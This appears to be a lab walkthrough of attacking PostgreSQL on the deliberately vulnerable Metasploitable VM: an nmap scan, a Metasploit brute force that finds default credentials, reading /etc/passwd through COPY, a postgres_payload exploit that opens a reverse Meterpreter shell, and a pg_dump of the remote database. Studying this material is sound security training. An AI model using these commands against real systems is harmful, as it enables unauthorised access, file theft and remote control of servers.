
Metasploitable/Postgres

This page covers activities on the Metasploitable virtualbox related to the postgresql service that is running.


Contents [hide]

    1 Recon
        1.1 Recon
        1.2 Search Metasploit for Exploits
    2 Scanner
        2.1 postgres_login
            2.1.1 Info
            2.1.2 Set Variables
            2.1.3 Results With Incorrect DB Name
            2.1.4 Correct login credentials
    3 Admin
        3.1 postgres_sql
            3.1.1 Trying to obtain /etc/passwd with postgres_sql
        3.2 postgres_readfile
    4 Payload
        4.1 Set Options
        4.2 Houston, We Have A Shell
    5 Dumping
    6 Related

Recon
Recon

Reminder, the remote machine (Metasploitable) is available at 10.0.0.27.

$ nmap -sS -sV -A 10.0.0.27

Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-22 18:30 PDT
Nmap scan report for 10.0.0.27
Host is up (0.016s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2016-03-23T01:31:31+00:00; +33s from scanner time.
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      42810/tcp  mountd
|   100005  1,2,3      45599/udp  mountd
|   100021  1,3,4      34385/tcp  nlockmgr
|   100021  1,3,4      60702/udp  nlockmgr
|   100024  1          38085/udp  status
|_  100024  1          52004/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    Java RMI Registry
1524/tcp open  shell       Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 53
|   Version: .0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ConnectWithDatabase, LongColumnFlag, SupportsCompression
|   Status: Autocommit
|_  Salt: w$K,8vk7k8tagd@PR*zK
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    Unknown security type (33554432)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         Unreal ircd
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   uptime: 0 days, 1:05:20
|   source ident: nmap
|   source host: 6D4CD63B.D3975B40.7B559A54.IP
|_  error: Closing Link: cxfhgnbdt[10.0.0.25] (Quit: cxfhgnbdt)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
MAC Address: 08:00:27:47:98:AD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|_  System time: 2016-03-22T21:31:31-04:00

TRACEROUTE
HOP RTT      ADDRESS
1   16.11 ms 10.0.0.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.31 seconds

Search Metasploit for Exploits

msf auxiliary(postgres_version) > search postgresql

Matching Modules
================

   Name                                                       Disclosure Date  Rank       Description
   ----                                                       ---------------  ----       -----------
   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
   post/linux/gather/enum_users_history                                        normal     Linux Gather User History

Scanner

One of the first pieces of information you will need, even before running a brute-force attack on a PostgreSQL login, is a database name.

Fortunately, the way that PostgreSQL works is by shipping with a default database called template1 that is the template database from which all other databases are created. This means that we can (probably) always find a database named template1 in any PostgreSQL database.

There is also a template0 database, which contains no local settings and is even more basic than template1, so there should always be at least these two known databases in any PostgreSQL service.
postgres_login

The postgresql login attack is at

msf > use auxiliary/scanner/postgres/postgres_login

Info

Information/description of the postgres login attack is given below:

Description:
  This module attempts to authenticate against a PostgreSQL instance
  using username and password combinations indicated by the USER_FILE,
  PASS_FILE, and USERPASS_FILE options. Note that passwords may be
  either plaintext or MD5 formatted hashes.

The various options for the postgres login attack are given below:

Basic options:
  Name              Current Setting                                                               Required  Description
  ----              ---------------                                                               --------  -----------
  BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
  DATABASE          template1                                                                     yes       The database to authenticate against
  DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
  DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
  PASSWORD                                                                                        no        A specific password to authenticate with
  PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
  Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
  RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
  RHOSTS                                                                                          yes       The target address range or CIDR identifier
  RPORT             5432                                                                          yes       The target port
  STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
  THREADS           1                                                                             yes       The number of concurrent threads
  USERNAME          postgres                                                                      no        A specific username to authenticate as
  USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
  USER_AS_PASS      false                                                                         no        Try the username as the password for all users
  USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
  VERBOSE           true                                                                          yes       Whether to print output for all attempts

Set Variables

To do this attack, we will want to set the following variables:

    try blank passwords
    set bruteforce speed to 5
    database name - (use template0 or template1)
    password file (see Kali/Wordlists)
    remote hosts 10.0.0.27 (metasploitable machine)
    stop on success true
    username/password file (try metasploit default)
    verbose

Things I'm not sure about:

    mainly how you know what database names are

After setting and unsetting a few variable values, we're ready to rock:

msf auxiliary(postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                               Required  Description
   ----              ---------------                                                               --------  -----------
   BLANK_PASSWORDS   true                                                                          no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
   DATABASE          postgresql                                                                    yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
   PASSWORD                                                                                        no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
   RHOSTS            10.0.0.27                                                                     yes       The target address range or CIDR identifier
   RPORT             5432                                                                          yes       The target port
   STOP_ON_SUCCESS   true                                                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                                                             yes       The number of concurrent threads
   USERNAME          root                                                                          no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                          yes       Whether to print output for all attempts

Results With Incorrect DB Name

Suppose you are able to correctly guess the username and password of the PostgreSQL database, but not the database name.

In this case, PostgreSQL will return a different code, and Metasploit will tell you that your credentials were good but that your database name was bad:

msf auxiliary(postgres_login) > run

[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: root:@postgresql (Incorrect: Invalid username or password)
[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: postgres:postgres@postgresql (Incorrect: C3D000, Creds were good but database was bad)
[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: postgres:password@postgresql (Incorrect: Invalid username or password)
[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: postgres:admin@postgresql (Incorrect: Invalid username or password)
[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: admin:admin@postgresql (Incorrect: Invalid username or password)
[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: admin:password@postgresql (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Unfortunately, during a brute-force attack, this information will fly by, and we would never know unless we were logging output to a file, and went back and checked it at some point. Lots of wasted time. Not particularly efficient.

Fortunately, every PostgreSQL instance will have a database named template1, so that should not be a problem.
Correct login credentials

Using the default database name of "template1" with username postgres/password postgres results in success:

msf auxiliary(postgres_login) > run

[-] 10.0.0.27:5432 POSTGRES - LOGIN FAILED: root:@template1 (Incorrect: Invalid username or password)
[+] 10.0.0.27:5432 - LOGIN SUCCESSFUL: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(postgres_login) >


Admin

Now that you have login credentials for the postgresql server, use them to do admin stuff.
postgres_sql

You can run arbitrary SQL statements with postgres:

msf auxiliary(postgres_login) > use auxiliary/admin/postgres/postgres_sql
msf auxiliary(postgres_sql) > info auxiliary/admin/postgres/postgres_sql

       Name: PostgreSQL Server Generic Query
     Module: auxiliary/admin/postgres/postgres_sql
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Basic options:
  Name           Current Setting   Required  Description
  ----           ---------------   --------  -----------
  DATABASE       template1         yes       The database to authenticate against
  PASSWORD                         no        The password for the specified username. Leave blank for a random password.
  RETURN_ROWSET  true              no        Set to true to see query result sets
  RHOST                            yes       The target address
  RPORT          5432              yes       The target port
  SQL            select version()  no        The SQL query to execute
  USERNAME       postgres          yes       The username to authenticate as
  VERBOSE        false             no        Enable verbose output

Description:
  This module will allow for simple SQL statements to be executed
  against a PostgreSQL instance given the appropiate credentials.

References:
  www.postgresql.org

msf auxiliary(postgres_sql) >

Set the remote host to the metasploitable virtualbox, and set the login credentials.

msf auxiliary(postgres_sql) > set RHOST 10.0.0.27
RHOST => 10.0.0.27
msf auxiliary(postgres_sql) > set PASSWORD postgres
PASSWORD => postgres
msf auxiliary(postgres_sql) > set SQL show databases

Postgres implements its databases differently from MySQL, so to list all the databases, we need a different command then "SHOW DATABASES". For PostgreSQL, it turns out we can use the pg_database database. The following SQL command gets names of databases from pg_database:

select datname from pg_database;

the following also works:

select pg_database.datname from pg_database;
</per>

Set this as the SQL statement:

<pre>
msf auxiliary(postgres_sql) > set SQL SELECT pg_database.datname from pg_database
SQL => SELECT pg_database.datname from pg_database
msf auxiliary(postgres_sql) > run

Query Text: 'SELECT pg_database.datname from pg_database'
=========================================================

    datname
    -------
    postgres
    template0
    template1

[*] Auxiliary module execution completed
msf auxiliary(postgres_sql) >

Trying to obtain /etc/passwd with postgres_sql

With MySQL, we were able to obtain files on the remote machine using the SQL statement select load_file(\'/etc/passwd\'). However, the load_file function isn't available in postgres.

Postgres implements it as load:

msf auxiliary(postgres_sql) > set SQL load \'/etc/passwd\'
SQL => load '/etc/passwd'

This has a problem, though: invalid elf header. (Like it is trying to load a binary file...?)

msf auxiliary(postgres_sql) > run

[-] 10.0.0.27:5432 Postgres - CXX000 SQL statement 'load '/etc/passwd'' returns #<RuntimeError: ERROR	CXX000	Mcould not load library "/etc/passwd": /etc/passwd: invalid ELF header	Fdfmgr.c	L240	Rinternal_load_library>
[*] Auxiliary module execution completed
msf auxiliary(postgres_sql) >

postgres_readfile

We saw above that the postgres_sql exploit doesn't allow you to load files as easily as, say, MySQL.

The readfile exploit in metasploit, however, provides a workaround.

msf auxiliary(postgres_sql) > use auxiliary/admin/postgres/
use auxiliary/admin/postgres/postgres_readfile  use auxiliary/admin/postgres/postgres_sql       
msf auxiliary(postgres_sql) > use auxiliary/admin/postgres/postgres_readfile
msf auxiliary(postgres_readfile) > info auxiliary/admin/postgres/postgres_readfile

       Name: PostgreSQL Server Generic Query
     Module: auxiliary/admin/postgres/postgres_readfile
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  DATABASE  template1        yes       The database to authenticate against
  PASSWORD                   no        The password for the specified username. Leave blank for a random password.
  RFILE     /etc/passwd      yes       The remote file
  RHOST                      yes       The target address
  RPORT     5432             yes       The target port
  USERNAME  postgres         yes       The username to authenticate as
  VERBOSE   false            no        Enable verbose output

Description:
  This module imports a file local on the PostgreSQL Server into a
  temporary table, reads it, and then drops the temporary table. It
  requires PostgreSQL credentials with table CREATE privileges as well
  as read privileges to the target file.

Now set options:

msf auxiliary(postgres_readfile) > set USERNAME postgres
USERNAME => postgres
msf auxiliary(postgres_readfile) > set PASSWORD postgres
PASSWORD => postgres
msf auxiliary(postgres_readfile) > set VERBOSE true
VERBOSE => true
msf auxiliary(postgres_readfile) > set RHOST 10.0.0.27
RHOST => 10.0.0.27
msf auxiliary(postgres_readfile) > run

[+] 10.0.0.27:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
[*] 10.0.0.27:5432 Postgres - querying with 'select has_database_privilege(current_user,current_database(),'TEMP')'
[*] 10.0.0.27:5432 Postgres - querying with 'CREATE TEMP TABLE lPHBxP (INPUT TEXT);
      COPY lPHBxP FROM '/etc/passwd';
      SELECT * FROM lPHBxP'
[*] 10.0.0.27:5432 Rows Returned: 37
Query Text: 'CREATE TEMP TABLE lPHBxP (INPUT TEXT);
      COPY lPHBxP FROM '/etc/passwd';
      SELECT * FROM lPHBxP'
=====================================================================================================================

    input
    -----
    backup:x:34:34:backup:/var/backups:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    bind:x:105:113::/var/cache/bind:/bin/false
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    dhcp:x:101:102::/nonexistent:/bin/false
    distccd:x:111:65534::/:/bin/false
    ftp:x:107:65534::/home/ftp:/bin/false
    games:x:5:60:games:/usr/games:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    klog:x:103:104::/home/klog:/bin/false
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
    mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
    news:x:9:9:news:/var/spool/news:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    postfix:x:106:115::/var/spool/postfix:/bin/false
    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proftpd:x:113:65534::/var/run/proftpd:/bin/false
    proxy:x:13:13:proxy:/bin:/bin/sh
    root:x:0:0:root:/root:/bin/bash
    service:x:1002:1002:,,,:/home/service:/bin/bash
    snmp:x:115:65534::/var/lib/snmp:/bin/false
    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
    statd:x:114:65534::/var/lib/nfs:/bin/false
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/bin/sh
    syslog:x:102:103::/home/syslog:/bin/false
    telnetd:x:112:120::/nonexistent:/bin/false
    tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
    user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh

[*] 10.0.0.27:5432 Postgres - /etc/passwd saved in /root/.msf5/loot/20160325044605_default_10.0.0.27_postgres.file_552946.txt
[+] 10.0.0.27:5432 Postgres - Command complete.
[*] 10.0.0.27:5432 Postgres - Disconnected
[*] Auxiliary module execution completed
msf auxiliary(postgres_readfile) >

Payload

To deliver a payload, use the payload module associated with Postgres:

msf > use exploit/linux/postgres/postgres_payload
msf exploit(postgres_payload) >

Set Options

Set some options:

msf exploit(postgres_payload) > set USERNAME postgres
USERNAME => postgres
msf exploit(postgres_payload) > set PASSWORD postgres
PASSWORD => postgres
msf exploit(postgres_payload) > set RHOST 192.168.1.101
RHOST => 192.168.1.101
msf exploit(postgres_payload) >

Houston, We Have A Shell

Running this exploit delivers you into a Meterpreter shell:

msf exploit(postgres_payload) > run

[*] Started reverse TCP handler on 192.168.1.1:4444
[*] 192.168.1.101:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/VfNryNXX.so, should be cleaned up automatically
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.1.101
[*] Meterpreter session 1 opened (192.168.1.1:4444 -> 192.168.1.101:36131) at 2016-04-02 21:34:12 -0700

meterpreter >


Dumping

To dump the contents of a postgres database, use the pg_dump command.

You can check all the flags with man pg_dump, but the basic ones you will need are:

    username postgres
    password (does not accept password typed as an argument on command line, apparently?)
    database (one of the three above, postgres, template0, or template1)
    table (you can use wildcards to match table names)
    a file to capture all the output

root@morpheus:~# pg_dump --host=10.0.0.27 --username=postgres --password --dbname=postgres --table='sometable' -f output_pgdump

Like mysqldump, pg_dump will output the SQL commands required to exactly replicate the database and tables selected.

However, unlike mysqldump, postgres implements an additional layer, implemented within SQL itself, that enables a lot of additional functionality. This implements all sorts of different databases and tables for postgresql user management and function definitions.

While this represents a huge attack surface that would make malicious code difficult to find, this postgresql database does not appear to be used for anything. The port is open and the server is listening, but there is no purpose. (Other than to provide Metasploitable spelunkers another route into the machine.)

That means that --table='*' will dump out a lot of superfluous stuff.
Related
